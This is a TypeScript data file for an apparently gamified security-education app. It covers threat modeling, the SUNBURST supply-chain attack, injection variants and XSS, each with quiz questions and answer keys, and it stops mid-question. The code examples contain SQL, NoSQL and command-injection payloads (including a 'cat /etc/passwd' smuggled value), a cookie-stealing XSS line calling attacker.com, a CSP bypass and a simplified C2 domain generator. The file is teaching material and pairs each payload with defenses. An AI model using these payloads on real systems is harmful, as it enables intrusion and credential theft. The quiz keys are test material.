import type { StageConfig } from "./types";

export const ancientUniversityStages: StageConfig[] = [
  // ─── univ-01: CIA Triad + STRIDE + Threat Modeling ────────────────────────────
  {
    epochId: "ancient",
    group: "university",
    wonder: { name: "Great Pyramid of Giza", location: "Giza, Egypt", era: "~2560 BCE", emoji: "🔺" },
    id: "univ-01",
    order: 1,
    title: "Threat Modeling with STRIDE",
    subtitle: "CIA Triad, STRIDE, DREAD, and structured adversarial thinking",
    category: "cybersecurity",
    xp: 80,
    badge: { id: "badge-univ-01", name: "Threat Architect", emoji: "🗺️" },
    challengeType: "quiz",
    info: {
      tagline: "Security engineering begins before the first line of code — by thinking like the attacker who will eventually read it.",
      year: 1999,
      overview: [
        "The CIA Triad (Confidentiality, Integrity, Availability) describes what security must protect, but it does not tell you how to find what can go wrong in a specific system. Microsoft Research formalized STRIDE in 1999 as a mnemonic for six threat categories: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege. Together, CIA and STRIDE form a complete analytical lens.",
        "Threat modeling is the practice of systematically enumerating adversarial scenarios against a specific design. The canonical process: (1) Decompose the system into components, data flows, trust boundaries, and entry points using a Data Flow Diagram (DFD); (2) Apply STRIDE to each element; (3) Prioritize with DREAD (Damage, Reproducibility, Exploitability, Affected users, Discoverability) or CVSS; (4) Mitigate or accept residual risk.",
        "Threat modeling reveals architectural flaws that code review misses. A buffer overflow is a code bug; designing an authentication system that can be bypassed by replaying a token is an architectural flaw. Microsoft's SDL mandates threat modeling before design reviews. The SDL insight: fixing a vulnerability in design costs hours. Fixing the same issue post-ship requires coordinated patching across millions of devices.",
      ],
      technical: {
        title: "STRIDE Applied to a REST API",
        body: [
          "Walk a POST /login endpoint through every STRIDE category: Spoofing — can the caller impersonate another user? (weak session token, no CSRF). Tampering — can the payload be modified in transit? (no TLS, no HMAC). Repudiation — can a user deny they authenticated? (no audit log). Information Disclosure — does a failed login reveal whether the username exists? (timing oracle). DoS — can an attacker lock out accounts? (no lockout threshold). Elevation of Privilege — can a valid user escalate to admin? (missing authorization check).",
          "DREAD scoring: Damage 0-10 (total breach = 10), Reproducibility (always = 10), Exploitability (script-kiddie = 10), Affected users (everyone = 10), Discoverability (public CVE = 10). Risk = average. A Spoofing via token replay might score D:8 R:9 E:7 A:9 D:6 = 7.8. Prioritize above a DoS scoring 3.0.",
        ],
        codeExample: {
          label: "DFD Trust Boundaries and STRIDE Mapping",
          code: `# Data Flow Diagram elements and STRIDE mapping
[Browser] --HTTPS--> [Load Balancer] --HTTP--> [App Server] --TCP--> [DB]
           TLS OK          ^ trust boundary          ^ trust boundary

# STRIDE per element:
# Browser -> LB:  Spoofing (user impersonation), Info Disclosure (no HSTS)
# LB -> App:      Tampering (internal traffic unencrypted), DoS (no rate limit)
# App -> DB:      Tampering (SQL injection), EoP (DB runs as root)

# Mitigations:
# - mTLS on internal hops   -> defeats Tampering
# - Parameterized queries   -> defeats SQLi Tampering
# - DB least-privilege user -> defeats EoP
# - Audit log all queries   -> defeats Repudiation`,
        },
      },
      incident: {
        title: "Microsoft SDL — Threat Modeling Prevents CVEs Before Ship",
        when: "2002 — Bill Gates' Trustworthy Computing memo mandated threat modeling company-wide",
        where: "Microsoft Windows and Office product lines",
        impact: "Products built under SDL demonstrated measurable reductions in post-ship CVEs compared to XP-era baselines",
        body: [
          "After Code Red (2001) and Nimda infected millions of Windows systems within hours, Gates halted all feature development to focus on security. The Security Development Lifecycle formalized threat modeling as a gate: products could not ship without a completed threat model reviewed by a security team. Teams using the SDL found entire classes of privilege escalation vulnerabilities during design — before a single line of vulnerable code was written.",
          "Windows Vista was the first OS built under full SDL. The SDL insight is quantified: a vulnerability found in design costs an engineer hours to fix. The same vulnerability post-ship requires coordinated patching across hundreds of millions of devices, regression testing, compatibility testing, and end-user disruption. Threat modeling is among the highest-ROI security investments available.",
        ],
      },
      diagram: {
        nodes: [
          { label: "STRIDE Threat", sub: "S/T/R/I/D/E categories", type: "attacker" },
          { label: "Data Flow Diagram", sub: "components and trust boundaries", type: "system" },
          { label: "CIA Pillar Broken", sub: "C/I/A impact per threat", type: "victim" },
          { label: "DREAD Prioritization", sub: "risk-ranked mitigation backlog", type: "result" },
        ],
      },
      timeline: [
        { year: 1999, event: "Loren Kohnfelder and Praerit Garg formalize STRIDE at Microsoft Research" },
        { year: 2002, event: "Gates' Trustworthy Computing memo; SDL mandated company-wide" },
        { year: 2006, event: "SDL becomes public; STRIDE adopted across the industry" },
        { year: 2014, event: "OWASP Threat Dragon released — open-source DFD tool" },
        { year: 2020, event: "NIST SP 800-154 Guide to Data-Centric System Threat Modeling published" },
      ],
      keyTakeaways: [
        "CIA Triad defines what to protect; STRIDE enumerates how attackers break each property.",
        "Threat modeling before code is written finds architectural flaws that code review cannot.",
        "Every trust boundary crossing in a DFD is a potential attack surface requiring STRIDE analysis.",
        "DREAD or CVSS scoring converts threat lists into prioritized remediation backlogs.",
      ],
      references: [
        { title: "Microsoft SDL Threat Modeling Tool", url: "https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool" },
        { title: "OWASP Threat Modeling Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html" },
      ],
    },
    quiz: {
      questions: [
        {
          id: "univ-01-q1",
          type: "STRIDE",
          challenge: `A login endpoint returns "Invalid password" for a
valid username but "User not found" for an invalid one.

Which STRIDE category does this differential
error message represent?`,
          text: "Differential login error messages — which STRIDE threat?",
          options: [
            "Spoofing — the attacker can impersonate a valid user",
            "Repudiation — the user can deny the login attempt",
            "Information Disclosure — reveals whether a username exists",
            "Elevation of Privilege — a normal user gains admin rights",
          ],
          correctIndex: 2,
          explanation: "Differential error messages constitute username enumeration — an Information Disclosure threat that reveals whether an account exists, enabling targeted credential attacks. Defense: return identical generic messages for both failure modes.",
        },
        {
          id: "univ-01-q2",
          type: "Threat Modeling",
          challenge: `In a Data Flow Diagram (DFD) threat model,
a component handles data moving from a web
app to a database server.

Where is the highest-priority location
for STRIDE analysis?`,
          text: "Highest-priority location for STRIDE analysis in a DFD?",
          options: [
            "Inside data stores (databases)",
            "Inside processes (application code)",
            "At trust boundary crossings between components",
            "At external entity interactions (user browser)",
          ],
          correctIndex: 2,
          explanation: "Trust boundary crossings are where data moves between components with different privilege levels. Every crossing is a potential attack surface — authentication, authorization, and input validation must be verified at each one.",
        },
        {
          id: "univ-01-q3",
          type: "CIA vs STRIDE",
          challenge: `An attacker modifies a financial transaction
in flight between a client app and the bank's
API. The amount changes from $100 to $10,000.

Which STRIDE category and CIA pillar are violated?`,
          text: "In-flight modification of financial data — STRIDE category and CIA pillar?",
          options: [
            "Spoofing — breaks Confidentiality",
            "Tampering — breaks Integrity",
            "Denial of Service — breaks Availability",
            "Repudiation — breaks Integrity",
          ],
          correctIndex: 1,
          explanation: "Tampering involves unauthorized modification of data — a direct attack on Integrity. The transaction amount was altered in transit (MITM), violating the Integrity pillar. Defense: TLS for transit encryption plus HMAC or digital signatures to detect modification.",
        },
        {
          id: "univ-01-q4",
          type: "DREAD Scoring",
          challenge: `Two STRIDE threats are identified:
A: Token replay attack. DREAD: D:8 R:9 E:7 A:9 D:6
B: Low-priority DoS. DREAD: D:3 R:4 E:3 A:2 D:3

Which threat gets remediated first, and why?`,
          text: "DREAD scoring — which threat has higher remediation priority?",
          options: [
            "Threat B — DoS affects all users simultaneously",
            "Threat A — DREAD score 7.8 vs 3.0; higher damage and exploitability",
            "Both equal — DREAD is a subjective scoring model",
            "Threat B — it was identified first in the threat model",
          ],
          correctIndex: 1,
          explanation: "Threat A scores (8+9+7+9+6)/5 = 7.8; Threat B scores (3+4+3+2+3)/5 = 3.0. DREAD converts qualitative threat descriptions into a prioritized remediation backlog. Higher scores get fixed first. Token replay has higher damage potential and exploitability, making it the priority.",
        },
      ],
    },
  },

  // ─── univ-02: Supply Chain Attacks — SolarWinds Deep Dive ─────────────────────
  {
    epochId: "ancient",
    group: "university",
    wonder: { name: "National Archives Building", location: "Washington, D.C.", era: "Present Day", emoji: "🏛️" },
    id: "univ-02",
    order: 2,
    title: "Supply Chain Compromise",
    subtitle: "SUNBURST: build pipeline poisoning, DGA evasion, and detection",
    category: "cybersecurity",
    xp: 80,
    badge: { id: "badge-univ-02", name: "Supply Chain Analyst", emoji: "🔗" },
    challengeType: "quiz",
    info: {
      tagline: "When you can't breach the target directly, compromise the software they already trust.",
      year: 2020,
      overview: [
        "A supply chain attack targets the software, hardware, or service delivery pipeline rather than the victim directly. The attacker compromises a trusted component so that the malicious payload arrives pre-signed and pre-authorized. The SolarWinds SUNBURST attack (2020) is the most technically sophisticated supply chain attack ever publicly documented. APT29 (SVR) inserted ~3,500 lines of backdoor code into Orion, a network monitoring platform used by 33,000 organizations including nine U.S. federal agencies.",
        "The malicious build passed SolarWinds' own code signing — the backdoor carried a legitimate digital signature. SUNBURST lay dormant for 12-14 days after installation, then performed domain generation algorithm (DGA) check-ins before activating. It masqueraded as legitimate Orion telemetry traffic, used internal SolarWinds namespaces, and checked for antivirus tools before executing.",
        "Detection came from an unexpected direction: FireEye noticed an anomaly on their own network — Orion processes making DNS queries to unusual external domains. The key signal was not the content of the traffic but the pattern: trusted software querying domains it had never queried before. FireEye notified SolarWinds, Microsoft, and CISA; a coordinated court order seized the C2 domain, simultaneously cutting off all active backdoors.",
      ],
      technical: {
        title: "SUNBURST: Technical Anatomy",
        body: [
          "The backdoor was inserted into SolarWinds.Orion.Core.BusinessLayer.dll — compiled during normal builds. The malicious class executed via a background thread spawned during normal Orion startup. First anti-analysis check: delay 12-14 days using a hardcoded timestamp to evade sandboxes (which rarely run samples >10 minutes). C2 used CNAME-based DNS over HTTPS to avoscloud[.]com subdomains constructed via a custom DGA seeded with the Active Directory domain.",
          "The hostname was encoded into the subdomain using a custom base32 variant so C2 traffic looked like normal Orion telemetry. SUNBURST also checked for active processes from a hardlist of security tools (Wireshark, SysMon, CarbonBlack, CrowdStrike) and went dormant if found. Detection guidance: CISA ED 21-03 provided Orion HTTPS beacon timing and DGA output pattern as indicators of compromise.",
        ],
        codeExample: {
          label: "SUNBURST DGA Domain Generation (simplified)",
          code: `# Simplified version of SUNBURST's domain generation algorithm
# Actual used custom base32 + XOR encoding of AD domain + timestamp

import hashlib, struct

def generate_c2_domain(ad_domain: str, seed_time: int) -> str:
    # Hash the AD domain name
    domain_hash = hashlib.md5(ad_domain.encode()).digest()
    # XOR with timestamp bytes to make each beacon unique
    ts_bytes = struct.pack(">Q", seed_time)
    subdomain_bytes = bytes(a ^ b for a, b in zip(domain_hash[:8], ts_bytes))
    # Encode as custom base32 (avoids common detection signatures)
    ALPHABET = "rq3gsalt6u1iyfzop572d4e8c"
    subdomain = "".join(ALPHABET[b % len(ALPHABET)] for b in subdomain_bytes)
    return f"{subdomain}.avoscloud.com"

# Detection: monitor DNS for Orion processes querying
# *.avoscloud.com, *.digitalcollege.org, *.freescanonline.com`,
        },
      },
      incident: {
        title: "SUNBURST — 9 Months Undetected in U.S. Government Networks",
        when: "October 2019 through December 2020",
        where: "SolarWinds build infrastructure spreading to 18,000 customer deployments",
        impact: "Nine U.S. federal agencies breached, including Treasury and DHS/CISA; months of email access for nation-state actors",
        body: [
          "The SVR gained access to SolarWinds' build pipeline no later than October 2019. They inserted a test backdoor to verify compilation and signing — a dry run. The full SUNBURST payload followed in February 2020. Among confirmed victims: U.S. Treasury (email access), DHS (including CISA itself), State Department, and FireEye. At Treasury, attackers read email for months.",
          "FireEye discovered SUNBURST on December 8, 2020 while investigating an anomaly on their own network. They immediately coordinated disclosure with Microsoft and CISA. A court order seized the SUNBURST C2 domain, cutting off all active backdoors simultaneously. Congress subsequently passed SolarWinds-inspired provisions in the FY2021 NDAA, fundamentally changing federal cybersecurity requirements.",
        ],
      },
      diagram: {
        nodes: [
          { label: "APT29 Build Poisoning", sub: "inserted in SolarWinds CI/CD", type: "attacker" },
          { label: "Orion Signed Update", sub: "18,000 orgs installed it", type: "system" },
          { label: "US Federal Agencies", sub: "Treasury, DHS, State, CISA", type: "victim" },
          { label: "SLSA + DNS Anomaly Detection", sub: "build attestation + DGA blocking", type: "result" },
        ],
      },
      timeline: [
        { year: 2019, event: "SVR gains access to SolarWinds build infrastructure; test backdoor inserted" },
        { year: 2020, event: "Full SUNBURST payload distributed in Orion 2019.4 and 2020.2 updates", highlight: true },
        { year: 2020, event: "FireEye discovers breach; court order seizes C2 domain; updates pulled" },
        { year: 2021, event: "CISA Emergency Directive ED-22-02; FY2021 NDAA cybersecurity provisions" },
        { year: 2022, event: "SLSA supply-chain security framework reaches v1.0; SBOMs mandated in EO 14028" },
      ],
      keyTakeaways: [
        "Supply chain attacks bypass perimeter security by arriving pre-authorized and pre-signed.",
        "SUNBURST's 12-14 day dormancy was specifically designed to defeat sandbox detection.",
        "DNS anomaly detection — unexpected external queries from internal software — is a high-signal indicator.",
        "Reproducible builds and build attestation (SLSA framework) are the primary technical countermeasures.",
      ],
      references: [
        { title: "CISA SUNBURST Advisory AA20-352A", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a" },
        { title: "SLSA Supply Chain Security Framework", url: "https://slsa.dev" },
      ],
    },
    quiz: {
      questions: [
        {
          id: "univ-02-q1",
          type: "Supply Chain",
          challenge: `SUNBURST arrived as a signed SolarWinds Orion
software update installed by IT teams at 18,000
organizations.

What made it particularly difficult to detect compared
to conventional malware?`,
          text: "What made SUNBURST particularly hard to detect?",
          options: [
            "It encrypted its payload with AES-256",
            "It exploited a zero-day in Windows Defender",
            "It arrived as a legitimately digitally-signed update from a trusted vendor",
            "It used novel polymorphic code that changed on every execution",
          ],
          correctIndex: 2,
          explanation: "SUNBURST was signed with SolarWinds' valid code-signing certificate, making it appear as a legitimate Orion update. Endpoint security tools, allowlisting systems, and IT administrators had no reason to block a signed update from their own vendor.",
        },
        {
          id: "univ-02-q2",
          type: "DGA Evasion",
          challenge: `SUNBURST used a Domain Generation Algorithm (DGA)
to contact its C2 server. Each beacon generated a
unique subdomain seeded from the victim's AD domain
and timestamp.

What was the primary security benefit for the attacker?`,
          text: "Why did SUNBURST use a DGA for C2 communication?",
          options: [
            "DGA domains are encrypted, preventing packet inspection",
            "Generated domains change per-beacon, frustrating static domain blocklists",
            "DGA requires no DNS infrastructure, reducing attacker footprint",
            "DGA traffic cannot be distinguished from HTTPS",
          ],
          correctIndex: 1,
          explanation: "Static domain/IP blocklists are a primary defensive tool. A DGA generates unique subdomains algorithmically, so blocking one subdomain does not prevent C2. Detection requires identifying the DGA pattern itself, not blocking individual domains.",
        },
        {
          id: "univ-02-q3",
          type: "Defense Framework",
          challenge: `Log4j was frequently a transitive dependency
during the Log4Shell crisis — organizations had
no systematic way to find all instances.

Which framework, if implemented before SUNBURST,
would have most accelerated remediation?`,
          text: "Which framework helps identify vulnerable supply chain components quickly?",
          options: [
            "STRIDE — for threat modeling the build pipeline",
            "SLSA (Supply-chain Levels for Software Artifacts) with build provenance attestation",
            "OWASP SAMM — for measuring software security maturity",
            "DREAD — for prioritizing known vulnerabilities",
          ],
          correctIndex: 1,
          explanation: "SLSA defines four levels of build provenance guarantees — from basic version control through hermetic, reproducible builds with tamper-evident attestation. Under SLSA L3+, an unauthorized binary injection like SUNBURST would be detectable by comparing the build attestation against the published source.",
        },
        {
          id: "univ-02-q4",
          type: "Detection",
          challenge: `SUNBURST included a 12-14 day dormancy period
before activating C2 communications.

Which detection system was this specifically
designed to evade?`,
          text: "SUNBURST's 12-14 day dormancy was designed to defeat which mechanism?",
          options: [
            "Intrusion Detection Systems (IDS)",
            "Automated sandbox analysis",
            "Network traffic analysis (PCAP)",
            "SIEM log correlation",
          ],
          correctIndex: 1,
          explanation: "Automated malware sandboxes typically analyze samples for seconds to minutes. A 12-14 day dormancy ensures the sample's malicious behavior is never triggered during sandbox analysis, causing automated systems to classify it as benign.",
        },
      ],
    },
  },

  // ─── univ-03: SQL Injection Variants ──────────────────────────────────────────
  {
    epochId: "ancient",
    group: "university",
    wonder: { name: "Library of Alexandria", location: "Alexandria, Egypt", era: "~300 BCE", emoji: "📜" },
    id: "univ-03",
    order: 3,
    title: "Injection at Depth",
    subtitle: "Blind SQLi, time-based attacks, NoSQL injection, and OS command injection",
    category: "cybersecurity",
    xp: 80,
    badge: { id: "badge-univ-03", name: "Injection Expert", emoji: "💉" },
    challengeType: "quiz",
    info: {
      tagline: "Most developers know about ' OR 1=1 --. Attackers use techniques that don't return a single visible character.",
      year: 2007,
      overview: [
        "SQL injection remains OWASP #1 ranked (under Injection). Classic in-band SQLi is well-understood and largely mitigated by parameterized queries. The dangerous variants are blind and out-of-band techniques that extract data through side channels: response differences, timing delays, or out-of-band DNS/HTTP callbacks. Tools like sqlmap automate binary-search extraction of full database contents via blind Boolean injection.",
        "Blind Boolean SQLi: the attacker asks true/false questions and infers data from whether the application's response changes — no error messages or data returned, only 'normal page' vs 'error page'. Time-based blind SQLi uses database-specific delay functions (SLEEP() in MySQL, pg_sleep() in PostgreSQL, WAITFOR DELAY in SQL Server) to encode bits as timing differences. This works even when the application returns identical HTTP responses to every query.",
        "NoSQL injection targets MongoDB, CouchDB, and similar document stores via query operators ($gt, $ne, $regex). OS command injection occurs when unsanitized user input is passed to shell functions. Unlike SQL, there is no universal parameterization library for NoSQL — each driver has different injection surfaces.",
      ],
      technical: {
        title: "Blind SQLi, NoSQL Injection, and OS Command Injection",
        body: [
          "Blind Boolean SQLi: inject `' AND SUBSTRING(password,1,1)='a'--` into a login parameter. If the application behaves differently, the first character is 'a'. Binary search reduces character extraction to 7 HTTP requests per character. sqlmap automates this against any injectable parameter.",
          "NoSQL (MongoDB) injection: `{ username: 'admin', password: { $ne: '' } }` returns all users because '$ne empty string' always evaluates true. OS command injection separators: `;`, `&&`, `||`, `$()`, backticks chain additional commands. Defense: never construct shell commands from user input; use subprocess arrays in Python (shell=False in Node.js).",
        ],
        codeExample: {
          label: "SQLi Variants and Defenses",
          code: `# VULNERABLE: in-band SQLi
query = "SELECT * FROM users WHERE name='" + user_input + "'"
# Input: ' OR 1=1--   -> dumps all users

# VULNERABLE: blind time-based (MySQL)
query = f"SELECT * FROM users WHERE id={user_input}"
# Input: 1 AND SLEEP(5)--   -> 5s delay = condition true

# VULNERABLE: NoSQL (MongoDB via pymongo)
collection.find({"username": username, "password": password})
# Input: password = {"$ne": ""}  -> matches any password!

# VULNERABLE: OS command injection (Python)
import os
os.system(f"ping {host}")   # host = "8.8.8.8; cat /etc/passwd"

# DEFENSE: parameterized queries (Python/psycopg2)
cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))

# DEFENSE: subprocess without shell
import subprocess
subprocess.run(["ping", "-c", "1", host], shell=False)  # safe`,
        },
      },
      incident: {
        title: "Heartland Payment Systems — 134 Million Cards via SQL Injection",
        when: "2007 through 2008",
        where: "Heartland Payment Systems, Princeton, New Jersey",
        impact: "$145 million in fraud settlements; 134 million card numbers stolen via network sniffer installed after initial SQLi",
        body: [
          "Albert Gonzalez and co-conspirators compromised Heartland via an SQL injection in a web application. Heartland processed 100 million card transactions per month. The attackers used their SQLi foothold to pivot onto the internal payment processing network and install network sniffers.",
          "The sniffer captured card data as it flowed unencrypted between terminals and the processor — over 100 million cards at peak. The breach was undetected for over a year. The case established that SQLi in an internet-facing application could compromise payment infrastructure isolated behind internal firewalls — demonstrating the blast radius when perimeter defenses fall.",
        ],
      },
      diagram: {
        nodes: [
          { label: "SQLi / NoSQL / CMDi Payload", sub: "user-controlled input to interpreter", type: "attacker" },
          { label: "Database / Shell", sub: "query executed without sanitization", type: "system" },
          { label: "Card Data / Credentials", sub: "134M cards (Heartland)", type: "victim" },
          { label: "Parameterized Queries", sub: "shell=False; input validation", type: "result" },
        ],
      },
      timeline: [
        { year: 1998, event: "Jeff Forristal documents SQL injection in Phrack Magazine" },
        { year: 2003, event: "OWASP Top Ten first edition; SQLi listed as #1 vulnerability" },
        { year: 2008, event: "Heartland breach: 134 million cards via SQLi pivot", highlight: true },
        { year: 2009, event: "sqlmap 0.6 released; automates blind/time-based SQLi extraction" },
        { year: 2021, event: "Injection remains OWASP A03:2021; blind/OOB techniques still widely exploited" },
      ],
      keyTakeaways: [
        "Blind and time-based SQLi extract complete databases without any visible error or data in responses.",
        "NoSQL databases are not immune to injection — each has unique operator-injection surfaces.",
        "OS command injection requires shell=False subprocess usage in Python/Node.js.",
        "Parameterized queries / prepared statements are the only universal defense against SQLi.",
      ],
      references: [
        { title: "OWASP SQL Injection Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" },
        { title: "PortSwigger Web Security Academy: SQL injection", url: "https://portswigger.net/web-security/sql-injection" },
      ],
    },
    quiz: {
      questions: [
        {
          id: "univ-03-q1",
          type: "Blind SQLi",
          challenge: `A login page returns "Welcome" for valid credentials
and "Error" for invalid ones. An attacker injects
1 AND SLEEP(5)-- as the username.

The page takes 5 seconds to respond.
What does this confirm?`,
          text: "5-second delay after SLEEP(5) injection — what does this confirm?",
          options: [
            "The database is MySQL and the parameter is injectable via time-based blind SQLi",
            "The server has a slow network connection",
            "The application uses parameterized queries",
            "The password field is vulnerable to Boolean injection",
          ],
          correctIndex: 0,
          explanation: "SLEEP(5) is MySQL-specific. A 5-second response confirms: (1) the username parameter is passed directly to a MySQL query without sanitization, and (2) the database is MySQL. This is time-based blind SQLi — no data is returned, but the timing side channel confirms injectability.",
        },
        {
          id: "univ-03-q2",
          type: "NoSQL Injection",
          challenge: `A MongoDB application authenticates with:
db.users.find({username: req.body.username,
               password: req.body.password})

An attacker sends:
  password: {"$ne": ""}

What is the result?`,
          text: "MongoDB $ne injection — what does the attacker achieve?",
          options: [
            "The query fails with a database syntax error",
            "The query matches all users whose password is not empty — authentication bypass",
            "MongoDB sanitizes $ne operators automatically",
            "The attacker must know the username for this to succeed",
          ],
          correctIndex: 1,
          explanation: "MongoDB's $ne (not equal) operator evaluates true for any non-empty password. The query becomes: find users where username = (input) AND password != ''. Since virtually all stored passwords are non-empty, this returns the first matching user — bypassing authentication. Defense: validate that inputs are strings before passing to MongoDB.",
        },
        {
          id: "univ-03-q3",
          type: "Injection Comparison",
          challenge: `Two injection techniques extract the same database:

A: Blind Boolean SQLi — application shows different
   behavior for true/false query conditions

B: Time-based blind SQLi — identical HTTP responses,
   only timing differs

When would an attacker prefer technique B over A?`,
          text: "When is time-based blind SQLi preferred over Boolean blind SQLi?",
          options: [
            "When the database is MySQL (Boolean only works on PostgreSQL)",
            "When the application returns completely identical responses regardless of query result",
            "When the attacker needs faster extraction speed",
            "Time-based is always preferred because it leaves fewer log entries",
          ],
          correctIndex: 1,
          explanation: "Boolean blind requires detectably different responses for true vs false conditions. Time-based works even when the application returns identical responses — the only signal is response latency. Time-based is slower (more round trips) but works against applications with completely uniform responses.",
        },
        {
          id: "univ-03-q4",
          type: "OS Command Injection",
          challenge: `Which Python code pattern is vulnerable to
OS command injection?

A: subprocess.run(["ping", "-c", "1", host], shell=False)
B: subprocess.run(f"ping -c 1 {host}", shell=True)
C: subprocess.run(["ping", host], capture_output=True)`,
          text: "Which subprocess call is vulnerable to OS command injection?",
          options: [
            "Option A — list form passes host as a direct argument",
            "Option B — shell=True passes the string to /bin/sh, enabling metacharacter injection",
            "Option C — capture_output=True prevents sanitization",
            "All three are equally vulnerable",
          ],
          correctIndex: 1,
          explanation: "shell=True passes the entire string to /bin/sh for interpretation, allowing shell metacharacters (;, &&, |) in `host` to inject additional commands. List form (Options A and C) bypasses shell parsing — each list element is passed directly as an argument, so metacharacters are treated as literal characters.",
        },
      ],
    },
  },

  // ─── univ-04: XSS at Scale ────────────────────────────────────────────────────
  {
    epochId: "ancient",
    group: "university",
    wonder: { name: "Colosseum", location: "Rome, Italy", era: "70–80 CE", emoji: "🏟️" },
    id: "univ-04",
    order: 4,
    title: "XSS at Scale",
    subtitle: "DOM, stored, reflected XSS — CSP bypass techniques and the Samy Worm",
    category: "cybersecurity",
    xp: 80,
    badge: { id: "badge-univ-04", name: "Client-Side Attacker", emoji: "🕷️" },
    challengeType: "quiz",
    info: {
      tagline: "XSS is not just stealing cookies. It is arbitrary JavaScript execution in every victim's browser — simultaneously.",
      year: 2005,
      overview: [
        "Cross-Site Scripting (XSS) allows attackers to inject JavaScript into web pages viewed by other users. The injected code runs in the victim's browser with full access to the page's DOM, cookies, localStorage, sessionStorage, and the ability to make authenticated requests. Three variants: Reflected (payload in URL), Stored (payload persisted in database, affects all viewers), and DOM-based (payload processed by client-side JavaScript without hitting the server).",
        "Stored XSS is the most severe: a single injection affects every user who views the infected content. The Samy Worm (2005) was the first XSS worm in history — it stored an XSS payload in a MySpace profile that added the attacker as a friend and replicated itself to each visitor's profile. Within 20 hours, it had spread to 1 million MySpace profiles. The site had to be taken offline.",
        "Content Security Policy (CSP) is the primary browser-level defense against XSS. CSP headers instruct browsers to only execute JavaScript from approved sources. However, CSP is frequently misconfigured, and known bypass techniques exploit unsafe-inline, unsafe-eval, JSONP endpoints on whitelisted domains, and Angular template injection.",
      ],
      technical: {
        title: "XSS Variants, Payload Techniques, and CSP Bypass",
        body: [
          "Reflected XSS: payload in HTTP request, echoed in response without sanitization. Victim must click a crafted URL. Stored XSS: payload stored in database (comment, profile field, forum post). Executes for every user who loads the page. DOM-based XSS: sink (innerHTML, eval, document.write) consumes attacker-controlled source (location.hash, location.search) without server involvement. Cannot be caught by server-side output encoding — requires client-side sanitization.",
          "CSP bypass techniques: (1) unsafe-inline in script-src nullifies CSP for inline scripts. (2) Whitelisted JSONP endpoint: if googleapis.com is in script-src, attacker uses its callback= JSONP endpoint to execute arbitrary JS. (3) Angular/Vue template injection: framework expression evaluators bypass CSP via the whitelisted CDN. (4) base-uri not set: attacker injects base href to redirect relative script sources. Defense: nonce-based CSP and DOMPurify sanitization.",
        ],
        codeExample: {
          label: "XSS Payload Progression and CSP Bypass",
          code: `// Classic reflected XSS payload
<script>fetch('https://attacker.com/'+document.cookie)</script>

// DOM-based XSS (no server involvement)
// Vulnerable sink: innerHTML
document.getElementById('output').innerHTML = location.hash.slice(1);
// Attack URL: https://example.com/#<img src=x onerror=alert(1)>

// CSP bypass via whitelisted JSONP endpoint
// CSP: script-src 'self' https://accounts.google.com
// Bypass: inject <script src="https://accounts.google.com/o/oauth2/
//         revoke?callback=alert(1337)"></script>
// Google's JSONP endpoint wraps callback param in function call!

// Defense: DOMPurify sanitization
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);  // strips scripts

// Strict CSP (nonce-based)
// Header: Content-Security-Policy: script-src 'nonce-r4nd0m123'
// Only scripts with matching nonce execute -- inline XSS blocked`,
        },
      },
      incident: {
        title: "The Samy Worm — 1 Million Profiles in 20 Hours",
        when: "October 4, 2005",
        where: "MySpace social network, global",
        impact: "MySpace taken entirely offline to remediate; first XSS worm in internet history proved self-replication at viral scale",
        body: [
          "Samy Kamkar, then 19, discovered that MySpace's HTML sanitizer blocked script tags but did not sanitize CSS expression() syntax in certain browsers. He crafted a profile payload that: (1) added him as a friend, (2) replicated the full payload into the victim's profile so every visitor would run it, (3) used XMLHttpRequest with the authenticated victim's session — bypassing CSRF tokens by reading them from the page first.",
          "The payload was only 4 kilobytes but chained multiple bypass techniques: CSS expressions for IE6, splitting the word 'javascript' with comments to evade the filter, and using eval() on a string split across multiple attributes. MySpace was taken offline on October 5 to remediate. Samy was sentenced to 3 years probation — establishing that XSS enables self-replicating worms at viral speed.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Stored XSS Payload", sub: "injected into DB once", type: "attacker" },
          { label: "Web Application", sub: "renders payload for every viewer", type: "system" },
          { label: "All Authenticated Users", sub: "Samy: 1M profiles in 20h", type: "victim" },
          { label: "Nonce CSP + DOMPurify", sub: "nonce per response; client sanitization", type: "result" },
        ],
      },
      timeline: [
        { year: 1999, event: "CERT Advisory on CSS (cross-site scripting) — term coined" },
        { year: 2005, event: "Samy Worm: 1 million MySpace profiles in 20 hours; site offline", highlight: true },
        { year: 2012, event: "W3C publishes Content Security Policy Level 1 specification" },
        { year: 2014, event: "CSP bypass via whitelisted JSONP endpoints documented by Gareth Heyes" },
        { year: 2021, event: "OWASP: Injection (includes XSS) is A03; DOM-based XSS dominant in SPAs" },
      ],
      keyTakeaways: [
        "Stored XSS is a force multiplier — one injection runs for every future page view.",
        "DOM-based XSS bypasses server-side sanitization entirely and requires client-side defenses.",
        "unsafe-inline or unsafe-eval in CSP script-src policies effectively nullifies CSP protection.",
        "Nonce-based CSP and DOMPurify are the most effective technical defenses available today.",
      ],
      references: [
        { title: "PortSwigger XSS Cheat Sheet", url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" },
        { title: "OWASP XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
      ],
    },
    quiz: {
      questions: [
        {
          id: "univ-04-q1",
          type: "XSS Worm",
          challenge: `The Samy Worm used XMLHttpRequest to write itself
to each victim's MySpace profile.

What made it uniquely dangerous compared to a
typical stored XSS payload?`,
          text: "What made the Samy Worm uniquely dangerous vs typical stored XSS?",
          options: [
            "It exfiltrated session cookies to an external server",
            "It self-replicated — each infected visitor's profile became a new spreading vector",
            "It exploited a zero-day in Internet Explorer's JavaScript engine",
            "It bypassed MySpace's authentication system entirely",
          ],
          correctIndex: 1,
          explanation: "Samy's payload used XMLHttpRequest with the victim's authenticated session to write itself to the victim's profile. Every visitor became a new infection vector. This self-replicating behavior — not just cookie theft — produced viral spread: 1 million profiles in 20 hours.",
        },
        {
          id: "univ-04-q2",
          type: "CSP Bypass",
          challenge: `A web app sets:
